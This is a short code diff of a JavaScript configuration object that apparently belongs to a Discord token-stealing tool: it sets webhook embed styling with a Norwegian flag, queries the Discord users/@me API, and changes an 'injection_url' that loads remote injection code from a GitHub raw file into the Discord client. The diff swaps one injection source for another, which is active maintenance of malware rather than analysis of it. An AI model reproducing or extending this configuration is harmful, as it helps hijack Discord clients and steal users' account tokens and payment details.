@@ -15,7 +15,7 @@ const config = {
   embed_name: 'JEG ELSKER NORGEE', 
   embed_icon: 'https://media.snl.no/media/8374/standard_norges_flagg.png',
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/EmiHackk/injectt/main/injection-clean.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
